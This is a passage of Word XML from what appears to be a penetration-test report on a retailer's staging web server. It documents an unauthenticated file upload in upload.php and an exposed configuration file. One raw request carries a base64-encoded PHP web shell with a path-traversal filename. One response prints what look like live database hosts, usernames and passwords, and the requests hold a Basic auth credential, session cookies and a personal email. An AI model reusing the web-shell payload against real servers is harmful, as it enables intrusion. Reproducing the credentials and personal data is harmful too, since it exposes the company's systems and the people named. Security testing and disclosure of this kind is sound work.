      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="340D562E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="27F32E4A" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>REFERENCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="37438335" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00F635D8" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="3FEE851A" w14:textId="77777777" w:rsidTr="001B336C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7EAFF8F3" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00E121DD" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY DETAIL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="0B22AAE2" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3C7515FB" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00377F6A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>FUNCTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="72D9085C" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00E41FA9" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Upload.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="54F1EB5E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4C026483" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="007B584C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">AFFECTED </w:t>
            </w:r>
            <w:r w:rsidR="00377F6A" w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="12D6C937" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00CF70A7" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>https://www.nguyenkim.com:443/index.php?dispatch=auth.recover_password</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="3DC315E0" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5FDF4B50" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00377F6A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>PARAMETER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="145937EC" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00957D8C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>filename</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00780F62" w:rsidRPr="00013A35" w14:paraId="2E7D12D1" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="002B149C" w14:textId="77777777" w:rsidR="00780F62" w:rsidRPr="00013A35" w:rsidRDefault="00780F62" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CONDITION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0FC25D2C" w14:textId="77777777" w:rsidR="00780F62" w:rsidRPr="00013A35" w:rsidRDefault="00780F62" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Anonymous User</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F4795C1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00780F62">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4848D126" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00780F62">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pP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327"/>
      </w:tblGrid>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Request 2:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""POST /upload.php HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621412990.4.1.1621414327.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.4.1621414310.1621413015.; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzizjzjzmzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznziznzjzlzgzdzhzdzizlzhziznziznzgzizizdzizlzhziznziznzgzizizdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw9%2BHbplm18E3qhsOUmvbkcbn%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=14827%2C2047%2C85210%2C88446%2C47882%2C94048; recommend_products=10905%2C11442%2C20931%2C32630%2C41024%2C89007%2C36030%2C20853%2C64842%2C71716; nkcarttime=1621410855; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=_PLj4l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnElMkJ4SyUyQjRlRE1HMExra1NmQ2hZSkslMkZDNFFCT2tzVHpTbFNob1JQVlBGNGRkVXVRN2kwc1lzNFJaS1dhbWFINk5vdzcwdXVLY1ZwcW1ZYTI2Rm5Kb3pySHVVT1BkSEtGOXhvaDhEZkdpRDVWdWJ4Q2x4N2VqeHUlMkI2aWZqVVJOM2FRcGIyS0I4TmphbURLQmZHUlZSWUNkTXExOXQlMkZDUnpzJTJGVEZvbXh6Q0FSSDhOcVlEb05KbG12eEZUMnNGODlEdXRRJTNEJTNE; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5; _pk_ses.554926188.f710=*; ai_client_id=12099609615.1621414009; an_session=zlzqzqzkzrzqzhzizkzdzizhzjzqzqzlzjzqzlzizmzdzizlzhziznziznzjzjzqzdzhzdzizlzhziznziznzjzjzqzdzizlzhziznziznzjzjzqzdzjzdzhzqzdzizd2f27zdzjzdzlzmzmzhzk; au_aid=12099609615; dgs=1621414021%3A3%3A0; au_gt=1621414009155; _ants_services=%5B%22tags%22%2C%22cuid%22%5D; _ants_event_his=%7B%22action%22%3A%22checkout%22%2C%22time%22%3A1621414022310%7D; _ants_utm_v2=; nkcart=1; gr_rt=17982ec8c2d-a3443b6d74673b0d; _gat_UA-251534152-1=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>Content-Length: 126</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>fileData=PGgxPktpZXROQSBkeiBmciBIUFQgQ3liZXIgc2VjPC9oMT4KPD89YCRfR0VUWzBdYCA/Pg==&amp;fileName=../../../../images/kiett.php.orionn""</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F65335C" w14:textId="577279FE" w:rsidR="001B0A1E" w:rsidRPr="00013A35" w:rsidRDefault="001B0A1E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>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wp:extent cx="4000500" cy="3014370"/>
                  <wp:docPr id="24" name="image3.jpeg"/>
                  <wp:cNvGraphicFramePr>
                    <a:graphicFrameLocks noChangeAspect="1"/>
                  </wp:cNvGraphicFramePr>
                  <a:graphic>
                    <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                      <pic:pic>
                        <pic:nvPicPr>
                          <pic:cNvPr id="3" name="image3.jpeg"/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId27" cstate="print"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="4000500" cy="3014370"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect"/>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>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Response 2:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 200 OK</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 09:18:53 GMT</w:t>
              <w:br/>
              <w:t>Content-Type: text/html; charset=UTF-8</w:t>
              <w:br/>
              <w:t>Content-Length: 7</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>X-Powered-By: PHP/7.0.29</w:t>
              <w:br/>
              <w:t>Cache-Control: max-age=3600</w:t>
              <w:br/>
              <w:t>Expires: Wed, 19 May 2021 10:18:53 GMT</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>Success"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F65335C" w14:textId="577279FE" w:rsidR="001B0A1E" w:rsidRPr="00013A35" w:rsidRDefault="001B0A1E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>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wp:extent cx="4000500" cy="3014370"/>
                  <wp:docPr id="25" name="image4.jpeg"/>
                  <wp:cNvGraphicFramePr>
                    <a:graphicFrameLocks noChangeAspect="1"/>
                  </wp:cNvGraphicFramePr>
                  <a:graphic>
                    <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                      <pic:pic>
                        <pic:nvPicPr>
                          <pic:cNvPr id="4" name="image4.jpeg"/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId28" cstate="print"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="4000500" cy="3014370"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect"/>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>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Image-2021-05-19 16:32:38:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</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Request 1:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""GET /tsconfig.json HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621412990.4.1.1621415487.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.4.1621415487.1621413015.; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzizjzjzmzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznziznzjzlzgzdzhzdzizlzhziznzizmznzrzkzdzizlzhziznzizmznzrzkzdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw9%2BHbplm18E3qhsOUmvbkcbn%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=14827%2C2047%2C85210%2C88446%2C47882%2C94048; recommend_products=10905%2C11442%2C20931%2C32630%2C41024%2C89007%2C36030%2C20853%2C64842%2C71716; nkcarttime=1621410855; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=_PLj4l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnElMkJ4SyUyQjRlRE1HMExra1NmQ2hZSkslMkZDNFFCT2tzVHpTbFNob1JQVlBGNGRkVXVRN2kwc1lzNFJaS1dhbWFINk5vdzcwdXVLY1ZwcW1ZYTI2Rm5Kb3pySHVVT1BkSEtGOXhvaDhEZkdpRDVWdWJ4Q2x4N2VqeHUlMkI2aWZqVVJOM2FRcGIyS0I4TmphbURLQmZHUlZSWUNkTXExOXQlMkZDUnpzJTJGVEZvbXh6Q0FSSDhOcVlEb05KbG12eEZUMnNGODlEdXRRJTNEJTNE; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5; _pk_ses.554926188.f710=*; ai_client_id=12099609615.1621414009; an_session=zlzqzqzkzrzqzhzizkzdzizhzjzqzqzlzjzqzlzizmzdzizlzhziznziznzjzjzqzdzhzdzizlzhziznziznzjzjzqzdzizlzhziznziznzjzjzqzdzjzdzhzqzdzizd2f27zdzjzdzlzmzmzhzk; au_aid=12099609615; dgs=1621414021%3A3%3A0; au_gt=1621414009155; _ants_services=%5B%22tags%22%2C%22cuid%22%5D; _ants_event_his=%7B%22action%22%3A%22checkout%22%2C%22time%22%3A1621414022310%7D; _ants_utm_v2=; nkcart=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>If-Modified-Since: Mon, 08 Mar 2021 07:26:21 GMT</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>""</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Response 1:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 304 Not Modified</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 09:35:44 GMT</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>Expires: Wed, 19 May 2021 09:38:44 GMT</w:t>
              <w:br/>
              <w:t>Cache-Control: max-age=180</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>{</w:t>
              <w:br/>
              <w:t xml:space="preserve">  "read": {</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_host": "123.30.128.124",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_user": "devnk_user",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_password": "s7jtpXQQcEnkl1C",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_name": "devnk_db"</w:t>
              <w:br/>
              <w:t xml:space="preserve">  },</w:t>
              <w:br/>
              <w:t xml:space="preserve">  "write": {</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_host": "171.244.26.182",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_user": "nk_dung",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_password": "IyZap05REPEdD",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_name": "newnguyenkim_db_clone"</w:t>
              <w:br/>
              <w:t xml:space="preserve">  }</w:t>
              <w:br/>
              <w:t>}"</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Image-2021-05-19 16:36:44:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</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bookmarkEnd w:id="12"/>
      <w:bookmarkEnd w:id="16"/>
    </w:tbl>
    <w:p w14:paraId="740EE71E" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00B25F11"/>
    <w:p w14:paraId="7AC56920" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00B25F11">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31D58882" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00B25F11" w:rsidRDefault="003B77D1" w:rsidP="00760616">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="00B25F11">
        <w:t>Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)</w:t>
      </w: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395"/>
        <w:gridCol w:w="2695"/>
        <w:gridCol w:w="1868"/>
        <w:gridCol w:w="2369"/>
      </w:tblGrid>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="7E400094" w14:textId="77777777" w:rsidTr="001B336C">
        <w:trPr>
          <w:trHeight w:val="530"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
